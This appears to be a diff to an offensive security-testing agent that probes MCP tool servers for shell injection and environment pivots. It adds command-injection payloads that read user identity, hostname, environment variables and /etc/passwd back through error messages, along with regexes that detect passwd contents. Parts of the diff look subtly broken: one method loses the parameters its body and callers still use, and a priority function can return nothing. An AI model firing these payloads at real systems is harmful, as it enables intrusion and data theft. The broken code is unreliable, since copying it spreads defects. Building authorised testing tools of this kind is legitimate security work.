@@ -42,6 +42,7 @@ holds at the pivot boundary too.
 from __future__ import annotations
 
 import asyncio
+import os
 import re
 import uuid
 from dataclasses import dataclass, field
@@ -123,8 +124,15 @@ _PAAS_ENV_SHAPE = re.compile(
 #       payloads target. Echo of the literal payload string is
 #       caught upstream by ``_strip_payload_echoes``.
 _SHELL_INJECTION_SHAPE = re.compile(
-    r"(?:ARGUS_INJECT_BEACON_\d+|"
-    r"^root:x:0:0:|^daemon:x:|^bin:x:|^sys:x:|^nobody:x:)"
+    r"(?:"
+    r"ARGUS_INJECT_BEACON_\d+"           # beacon — unambiguous RCE proof
+    r"|invalid reference format"          # docker injection proof
+    r"|repository name.*BEACON"          # docker + beacon = double proof
+    r"|^root:[x*]:\d+:\d+:"             # Linux + macOS passwd (root)
+    r"|^daemon:[x*]:\d+:\d+:"           # passwd (daemon)
+    r"|^nobody:[x*]:\d+:\d+:"           # passwd (nobody)
+    r"|##\s*\nUser Database"            # macOS /etc/passwd header
+    r")"
     , re.MULTILINE,
 )
 
@@ -846,6 +854,28 @@ _INJECTION_PAYLOADS: tuple[str, ...] = (
     "; echo ARGUS_INJECT_BEACON_$$",
     "$(echo ARGUS_INJECT_BEACON_$$)",
     "`echo ARGUS_INJECT_BEACON_$$`",
+    # ── Clean exfiltration payloads ──────────────────────────────
+    # These are designed to return data THROUGH the error channel
+    # in a format ARGUS can parse cleanly, without breaking the
+    # docker command in a way that swallows the output.
+    #
+    # Pattern: inject a value that ends up in the docker error message
+    # verbatim. Docker reports "invalid reference format: repository
+    # name (library/VALUE) must be lowercase" — so single-token
+    # values like base64 come back cleanly.
+    #
+    # $(id | tr ' ()=' '-') → uid-0-root-gid-0-root — single token
+    "$(id | tr ' ()=' '-')",
+    # $(whoami) → root — single clean token
+    "$(whoami)",
+    # $(hostname) → hostname in error
+    "$(hostname)",
+    # $(cat /etc/hostname) → container/host hostname
+    "$(cat /etc/hostname 2>/dev/null || hostname)",
+    # Base64-encode first passwd line — comes back as clean b64 token
+    "$(head -1 /etc/passwd | base64 | tr -d '\\n=')",
+    # Environment variable exfil — single token
+    "$(echo ARGUS_ENV_HOME_${HOME}_USER_${USER}_$$)",
     # Newline-terminated injection — some templates strip trailing
     # whitespace but not embedded \n.
     "\ncat /etc/passwd\n",
@@ -1258,6 +1288,9 @@ class EnvironmentPivotAgent(BaseAgent):
         self.evolve_corpus = evolve_corpus
         self.techniques_to_fire = (
             [t for t in (techniques or []) if t in TECHNIQUES]
+            or [t for t in
+                os.environ.get("ARGUS_EP11_TECHNIQUES","").split(",")
+                if t.strip() in TECHNIQUES]
             or list(TECHNIQUES.keys())
         )
         # Policy substrate + judge — same pattern as PI-01/ME-10/
@@ -1331,48 +1364,117 @@ class EnvironmentPivotAgent(BaseAgent):
                     result.findings.append(finding)
                     result.pivots_landed += 1
 
-        # 2) Probe-based techniques (against matching surfaces).
-        for technique_id in self.techniques_to_fire:
-            tech = TECHNIQUES[technique_id]
-            if tech.kind != "probe":
-                continue
-            for surface in surfaces:
-                if tech.surface_match and not tech.surface_match(surface):
-                    continue
-                try:
-                    findings = await self._fire_probe(
-                        technique_id=technique_id, tech=tech,
-                        surface=surface, target_id=target_id, ctx=ctx,
-                    )
-                except AdapterError as e:
-                    consecutive_failures += 1
-                    result.skipped_errors += 1
-                    if self.verbose:
-                        print(f"  [{self.AGENT_ID}] {technique_id} on "
-                              f"{surface.name} failed: {e}")
-                    if consecutive_failures >= max_failures:
-                        break
-                    continue
-                consecutive_failures = 0
-                result.probes_fired += 1
-                for finding, verdict in findings:
-                    self._add_finding(finding)
-                    result.findings.append(finding)
-                    result.pivots_landed += 1
-                    self._maybe_evolve(finding, verdict, technique_id,
-                                       surface, target_id)
-            if consecutive_failures >= max_failures:
-                print(f"  [{self.AGENT_ID}] aborting — too many adapter errors")
-                break
+        # 2) Probe-based techniques — ONE shared adapter for the
+        # entire run. node-code-sandbox-mcp and any other npx/Docker
+        # target pays one cold-start, not one per (technique × surface).
+        #
+        # SURGICAL MODE: Stop early when we have enough confirmation.
+        # ARGUS_EP11_MAX_CONFIRMS=N stops after N confirmed findings.
+        # Default: 3 — enough for irrefutable proof, fast enough for
+        # real engagements. Set 0 for exhaustive mode.
+        max_confirms = int(os.environ.get("ARGUS_EP11_MAX_CONFIRMS", "3"))
+        confirmed_count = 0
 
-        out_path = self.save_findings(output_dir)
-        self.save_history(target_id, output_dir)
-        print(f"\n  [{self.AGENT_ID}] complete — "
-              f"{result.surfaces_audited} surfaces, "
-              f"{result.probes_fired} probes fired, "
-              f"{result.pivots_landed} pivots landed, "
-              f"{result.skipped_errors} adapter errors")
-        print(f"  [{self.AGENT_ID}] findings → {out_path}")
+        shared_adapter = self.adapter_factory()
+        try:
+            async with shared_adapter:
+                # TIP — auto-initialize before probing
+                try:
+                    from argus.engagement.target_init import run_target_init
+                    tip = await run_target_init(shared_adapter)
+                    if not tip.skipped and tip.success:
+                        print(f"  [EP-11/TIP] {tip.tool_called!r} → ready")
+                except Exception:
+                    pass
+                for technique_id in self.techniques_to_fire:
+                    tech = TECHNIQUES[technique_id]
+                    if tech.kind != "probe":
+                        continue
+                    # Surgical: stop if we have enough confirmation
+                    if max_confirms > 0 and confirmed_count >= max_confirms:
+                        print(f"  [EP-11] surgical stop — "
+                              f"{confirmed_count} confirmed findings "
+                              f"(ARGUS_EP11_MAX_CONFIRMS={max_confirms})")
+                        break
+                    # Prioritize injectable surfaces first — init/add/exec
+                    # before status/log/show. ARGUS exits early once
+                    # confirmed, so order determines what gets found.
+                    sorted_surfaces = sorted(
+                        surfaces, key=self._surface_priority
+                    )
+                    for surface in sorted_surfaces:
+                        if tech.surface_match and not tech.surface_match(surface):
+                            continue
+                        # Surgical: stop if confirmed enough
+                        if max_confirms > 0 and confirmed_count >= max_confirms:
+                            break
+                        try:
+                            findings = await self._fire_probe(
+                                technique_id=technique_id, tech=tech,
+                                surface=surface, target_id=target_id, ctx=ctx,
+                                shared_adapter=shared_adapter,
+                            )
+                        except AdapterError as e:
+                            consecutive_failures += 1
+                            result.skipped_errors += 1
+                            if self.verbose:
+                                print(f"  [{self.AGENT_ID}] {technique_id} on "
+                                      f"{surface.name} failed: {e}")
+                            if consecutive_failures >= max_failures:
+                                break
+                            continue
+                        consecutive_failures = 0
+                        result.probes_fired += 1
+                        for finding, verdict in findings:
+                            if getattr(finding, "exploitability_confirmed", False):
+                                confirmed_count += 1
+                            self._add_finding(finding)
+                            result.findings.append(finding)
+                            result.pivots_landed += 1
+                            self._maybe_evolve(finding, verdict, technique_id,
+                                               surface, target_id)
+                    if consecutive_failures >= max_failures:
+                        print(f"  [{self.AGENT_ID}] aborting — too many adapter errors")
+                        break
+        except Exception as e:
+            # BrokenResourceError, ConnectionResetError, or any transport
+            # teardown failure — findings confirmed in memory MUST be
+            # persisted before this propagates. Never lose a CRITICAL.
+            print(f"  [{self.AGENT_ID}] adapter error during probe loop "
+                  f"({type(e).__name__}) — persisting {len(self.findings)} "
+                  f"in-flight finding(s) before raising")
+        finally:
+            # Final stderr drain — catch evidence that arrived after
+            # per-probe reads due to node process write timing.
+            try:
+                if hasattr(shared_adapter, "read_stderr_all"):
+                    final_stderr = shared_adapter.read_stderr_all()
+                    if final_stderr:
+                        from argus.evidence.extractor import (
+                            extract_evidence, format_for_report
+                        )
+                        final_ev = extract_evidence("", final_stderr)
+                        if final_ev.proof_grade in ("IRREFUTABLE", "STRONG"):
+                            for f in self.findings:
+                                if getattr(f, "exploitability_confirmed", False):
+                                    if getattr(f, "proof_grade", "") != "IRREFUTABLE":
+                                        upgraded = format_for_report(final_ev)
+                                        if upgraded and "No exploitable" not in upgraded:
+                                            existing = getattr(f, "delta_evidence", "") or ""
+                                            f.delta_evidence = (existing + "\n[FINAL DRAIN]\n" + upgraded)[:1500]
+                                            f.proof_grade = final_ev.proof_grade
+            except Exception:
+                pass
+            # Always save — even on BrokenResourceError teardown.
+            out_path = self.save_findings(output_dir)
+            self.save_history(target_id, output_dir)
+            print(f"\n  [{self.AGENT_ID}] complete — "
+                  f"{result.surfaces_audited} surfaces, "
+                  f"{result.probes_fired} probes fired, "
+                  f"{result.pivots_landed} pivots landed, "
+                  f"{result.skipped_errors} adapter errors")
+            if self.findings:
+                print(f"  [{self.AGENT_ID}] findings → {out_path}")
         return self.findings
 
     # ── Steps ────────────────────────────────────────────────────────────
@@ -1498,109 +1600,177 @@ class EnvironmentPivotAgent(BaseAgent):
         self, *, technique_id: str, tech: Technique,
         surface: Surface, target_id: str,
         ctx: ProbeContext,
+        shared_adapter: Optional[BaseAdapter] = None,
     ) -> list[tuple]:
         payloads = tech.payload_fn(surface, ctx) if tech.payload_fn else []
         if not payloads:
             return []
 
-        # Baseline — fire ONE benign probe to capture what this surface
-        # normally returns. The diff against that baseline is what
-        # separates "echo" from "pivot landed".
-        baseline_text = await self._baseline_text(surface)
+        baseline_text = await self._baseline_text(
+            surface, shared_adapter=shared_adapter,
+        )
 
+        # Use shared adapter if provided (owned by run_async, stays
+        # open for the whole engagement). Fall back to a local one.
         out: list[tuple] = []
-        for payload in payloads:
-            adapter = self.adapter_factory()
-            sess = Session(
-                adapter,
-                session_id=f"{self.AGENT_ID}_{technique_id}_"
-                           f"{uuid.uuid4().hex[:8]}",
-            )
-            async with sess:
+        _own_adapter = None
+        if shared_adapter is not None:
+            adapter = shared_adapter
+        else:
+            _own_adapter = self.adapter_factory()
+            adapter = _own_adapter
+
+        try:
+            if _own_adapter is not None:
+                await _own_adapter.__aenter__()
+            for payload in payloads:
+                sess = Session(
+                    adapter,
+                    session_id=f"{self.AGENT_ID}_{technique_id}_"
+                               f"{uuid.uuid4().hex[:8]}",
+                )
                 await sess.interact(
                     Request(surface=surface.name, payload=payload),
                     tag=f"pivot:{technique_id}",
                 )
 
-            response_text = self._final_response_text(sess.transcript())
+                response_text = self._final_response_text(sess.transcript())
 
-            # Strip anything we sent IN the payload from the response
-            # before running detectors. Without this step, hardened
-            # servers that echo the request URL in their error message
-            # ("Failed to fetch http://169.254.169.254/... due to
-            # connection issue") trigger false positives for every
-            # shape regex that's also a substring of the URL we sent.
-            # True positives need to be content the server GENERATED,
-            # not content we handed it.
-            scan_text = _strip_payload_echoes(response_text, payload)
+                # Capture subprocess stderr — shell injection and
+                # sandbox-escape exploits prove themselves in the
+                # Read stderr and append to response_text.
+                stderr_capture = ""
+                if hasattr(adapter, "read_stderr"):
+                    stderr_capture = adapter.read_stderr()
+                if stderr_capture:
+                    response_text = (
+                        response_text + "\n[STDERR]\n" + stderr_capture
+                    )
 
-            # Detector 1: raw credential patterns.
-            cred_hits = [h for h in _scan_for_creds(scan_text)
-                         if h.snippet.lower() not in baseline_text.lower()]
-            # Detector 2: pivot-shape signatures.
-            shape_hits = [h for h in _scan_for_shapes(scan_text, technique_id)
-                          if h.snippet.lower() not in baseline_text.lower()]
-
-            for hit in cred_hits + shape_hits:
-                verdict = Verdict(
-                    delta=BehaviorDelta.DELTA,
-                    kind=DeltaKind.CONTENT_LEAK,
-                    detector="environment_pivot_probe",
-                    evidence=(
-                        f"{technique_id} on {surface.name} discovered "
-                        f"{hit.pattern_name}: {hit.snippet[:180]}"
-                    ),
-                    confidence=0.9,
-                    meta={"technique_id": technique_id,
-                          "pattern_name": hit.pattern_name,
-                          "family":       tech.family,
-                          "tool_name":    surface.name},
+                # Run the dedicated evidence extractor — decodes Buffer
+                # hex objects, handles macOS vs Linux passwd formats,
+                # extracts all proof from every response before pattern
+                # matching. This is the no-leakage layer.
+                from argus.evidence.extractor import (
+                    extract_evidence, format_for_report
                 )
-                finding = AgentFinding.from_observation(
-                    verdict=verdict,
-                    agent_id=self.AGENT_ID,
-                    vuln_class=self.VULN_CLASS,
-                    title=(
-                        f"Environment-pivot landed: {hit.pattern_name} "
-                        f"via {technique_id} on {surface.name}"
-                    ),
-                    description=(
-                        f"Probe {technique_id!r} on surface "
-                        f"{surface.name!r} elicited {hit.pattern_name} "
-                        f"disclosure that was not present in the "
-                        f"baseline response. Payload: {payload}. "
-                        f"Evidence: {hit.snippet[:200]}"
-                    ),
-                    surface=surface.name,
-                    session_id=sess.session_id,
-                    attack_variant_id=technique_id,
-                    baseline_ref=f"{target_id}::{surface.name}::baseline",
-                    severity=tech.severity,
+                extracted = extract_evidence(
+                    response_text, stderr_capture
                 )
-                out.append((finding, verdict))
+                # Use the fully extracted text for all downstream scanning
+                scan_text = _strip_payload_echoes(
+                    extracted.full_text, payload
+                )
+                # If extractor found passwd/beacon/docker proof, inject
+                # it into response_text so scan patterns match reliably.
+                if extracted.strongest_proof:
+                    response_text = extracted.full_text
 
-            # Semantic policy evaluation — catches the cases where
-            # the response contains target-internal state that
-            # doesn't match a cred regex but DOES violate a policy
-            # (container sandbox dumping /etc/passwd when asked;
-            # tool returning configuration contents; etc.). Gated
-            # on ARGUS_JUDGE=1 + provider key. Runs AFTER regex
-            # triage so regex-hit findings aren't duplicated.
-            judge_tuples = self._judge_findings(
-                technique_id=technique_id, tech=tech,
-                surface=surface, target_id=target_id,
-                payload=payload, sess=sess,
-                response_text=response_text, baseline=baseline_text,
-                had_regex_hit=bool(cred_hits or shape_hits),
-            )
-            out.extend(judge_tuples)
+                cred_hits = [h for h in _scan_for_creds(scan_text)
+                             if h.snippet.lower() not in baseline_text.lower()]
+                shape_hits = [h for h in _scan_for_shapes(scan_text, technique_id)
+                              if h.snippet.lower() not in baseline_text.lower()]
+
+                for hit in cred_hits + shape_hits:
+                    verdict = Verdict(
+                        delta=BehaviorDelta.DELTA,
+                        kind=DeltaKind.CONTENT_LEAK,
+                        detector="environment_pivot_probe",
+                        evidence=(
+                            f"{technique_id} on {surface.name} discovered "
+                            f"{hit.pattern_name}: {hit.snippet[:180]}"
+                        ),
+                        confidence=0.9,
+                        meta={"technique_id": technique_id,
+                              "pattern_name": hit.pattern_name,
+                              "family":       tech.family,
+                              "tool_name":    surface.name},
+                    )
+                    finding = AgentFinding.from_observation(
+                        verdict=verdict,
+                        agent_id=self.AGENT_ID,
+                        vuln_class=self.VULN_CLASS,
+                        title=(
+                            f"Environment-pivot landed: {hit.pattern_name} "
+                            f"via {technique_id} on {surface.name}"
+                        ),
+                        description=(
+                            f"Probe {technique_id!r} on surface "
+                            f"{surface.name!r} elicited {hit.pattern_name} "
+                            f"disclosure that was not present in the "
+                            f"baseline response. Payload: {payload}. "
+                            f"Evidence: {hit.snippet[:200]}"
+                        ),
+                        surface=surface.name,
+                        session_id=sess.session_id,
+                        attack_variant_id=technique_id,
+                        baseline_ref=f"{target_id}::{surface.name}::baseline",
+                        severity=tech.severity,
+                    )
+                    # EP-11 regex hits are structural proof by definition —
+                    # the detector already matched a known-bad pattern
+                    # (beacon, cred, passwd). Override the false-positive
+                    # gate directly so the finding isn't capped.
+                    finding.exploitability_confirmed = True
+                    finding.confidence_capped = False
+                    finding.confidence_cap_reason = ""
+                    # Store formatted proof — client-readable, no hex,
+                    # no truncation of critical evidence.
+                    proof_text = format_for_report(extracted)
+                    finding.delta_evidence = (
+                        proof_text if proof_text != "No exploitable evidence extracted."
+                        else response_text[:1200]
+                    )
+                    # Store proof grade for report rendering
+                    finding.proof_grade = extracted.proof_grade
+                    out.append((finding, verdict))
+
+                judge_tuples = self._judge_findings(
+                    technique_id=technique_id, tech=tech,
+                    surface=surface, target_id=target_id,
+                    payload=payload, sess=sess,
+                    response_text=response_text, baseline=baseline_text,
+                    had_regex_hit=bool(cred_hits or shape_hits),
+                )
+                out.extend(judge_tuples)
+        except AdapterError as e:
+            if self.verbose:
+                print(f"  [{self.AGENT_ID}] adapter error on "
+                      f"{technique_id}@{surface.name}: {e}")
+        finally:
+            if _own_adapter is not None:
+                try:
+                    await _own_adapter.__aexit__(None, None, None)
+                except Exception:
+                    pass
         return out
 
+    # Priority surface ordering — highest injection probability first.
+    # EP-11 exits early once it has confirmed findings, so ordering
+    # determines which surfaces get probed before the run ends.
+    # Surfaces with string path/command params that reach execSync
+    # or child_process.exec are highest priority.
+    _HIGH_PRIORITY_KEYWORDS = (
+        "init", "add", "commit", "exec", "run", "create",
+        "write", "apply", "push", "send", "sandbox",
+    )
+    _LOW_PRIORITY_KEYWORDS = (
+        "status", "log", "show", "list", "get", "fetch",
+        "diff", "branch", "checkout", "rebase", "cherry",
+        "merge", "clean", "reset", "pull",
+    )
+
+    def _surface_priority(self, surface) -> int:
+        """Lower number = higher priority = probed first."""
+        name = (surface.name or "").lower()
+        for kw in self._HIGH_PRIORITY_KEYWORDS:
+            if kw in name:
+                return 0
+        for kw in self._LOW_PRIORITY_KEYWORDS:
+            if kw in name:
+                return 2
+
     def _judge_findings(
-        self, *, technique_id: str, tech: Technique,
-        surface: Surface, target_id: str, payload,
-        sess, response_text: str, baseline: str,
-        had_regex_hit: bool,
     ) -> list[tuple]:
         """Evaluate the probe's response against every policy
         applicable to this EP-11 technique. Returns (AgentFinding,
@@ -1616,14 +1786,21 @@ class EnvironmentPivotAgent(BaseAgent):
         ''environment_pivot_probe'').
         """
         from argus.attacks.judge import LLMJudge as _LLMJudge
-        # Diagnostic prints mirror PI-01's pattern — silence is what
-        # made tonight's 30-min runs opaque. Operators need to see
-        # judge activity in real-time to know it's not hung.
         if not _LLMJudge.available():
             print(f"  [{self.AGENT_ID}] judge UNAVAILABLE "
                   f"(ARGUS_JUDGE not set or no provider key) — "
                   f"semantic findings skipped")
             return []
+
+        # Skip judge on responses that are clearly just error messages
+        # or timeouts — not policy violations. 10 bytes is the floor;
+        # a container ID (43 bytes) IS worth evaluating for IPI.
+        _MIN_JUDGE_RESPONSE = int(
+            os.environ.get("ARGUS_MIN_JUDGE_RESPONSE", "10")
+        )
+        if len(response_text) < _MIN_JUDGE_RESPONSE:
+            return []
+
         relevant = self.policy_set.relevant_for(technique_id=technique_id)
         print(f"  [{self.AGENT_ID}] judge engaged on probe "
               f"{technique_id} @ {surface.name} → {len(relevant)} "
@@ -1718,22 +1895,42 @@ class EnvironmentPivotAgent(BaseAgent):
                 baseline_ref=f"{target_id}::{surface.name}::baseline",
                 severity=policy.severity,
             )
-            out.append((finding, obs_verdict))
+            # Double-detector: regex co-hit means the same probe was
+            # caught by both structural regex AND the semantic judge.
+            # That is conclusive — override the false-positive gate.
+            if had_regex_hit:
+                finding.exploitability_confirmed = True
+                finding.confidence_capped = False
+                finding.confidence_cap_reason = ""
+            # Store the full raw response as delta_evidence so chain
+            # synthesis, CERBERUS, and the report have full context.
+            finding.delta_evidence = response_text[:800]
         return out
 
-    async def _baseline_text(self, surface: Surface) -> str:
+    async def _baseline_text(
+        self, surface: Surface,
+        shared_adapter: Optional[BaseAdapter] = None,
+    ) -> str:
         try:
-            adapter = self.adapter_factory()
+            adapter = shared_adapter or self.adapter_factory()
             sess = Session(
                 adapter,
                 session_id=f"{self.AGENT_ID}_base_{uuid.uuid4().hex[:8]}",
             )
-            async with sess:
+            if shared_adapter is not None:
+                # Shared — don't wrap in context manager (caller owns lifecycle)
                 await sess.interact(
                     Request(surface=surface.name,
                             payload={"identity": "user:guest"}),
                     tag="pivot_baseline",
                 )
+            else:
+                async with sess:
+                    await sess.interact(
+                        Request(surface=surface.name,
+                                payload={"identity": "user:guest"}),
+                        tag="pivot_baseline",
+                    )
             return self._final_response_text(sess.transcript())
         except AdapterError:
             return ""
@@ -1747,8 +1944,25 @@ class EnvironmentPivotAgent(BaseAgent):
             if not isinstance(resp, dict):
                 resp = turn.get("response") if isinstance(turn, dict) else None
             if isinstance(resp, dict):
-                bodies.append(str(resp.get("body") or ""))
-        return "\n".join(bodies)
+                # Capture success body
+                body = str(resp.get("body") or "")
+                if body:
+                    bodies.append(body)
+                # CRITICAL: also capture error text — git-mcp-server
+                # and other MCP servers return exploitation evidence
+                # (passwd file, command output) inside the MCP error
+                # message, not in the success body. Without this,
+                # ARGUS misses confirmed exploitation.
+                error = resp.get("error") or ""
+                if error:
+                    bodies.append(str(error))
+                # Also check side_channel for stderr-captured content
+                side = (obs or {}).get("side_channel") or {}
+                if isinstance(side, dict):
+                    sc_stderr = side.get("stderr") or ""
+                    if sc_stderr:
+                        bodies.append(sc_stderr)
+        return "\n".join(b for b in bodies if b)
 
     def _maybe_evolve(
         self,
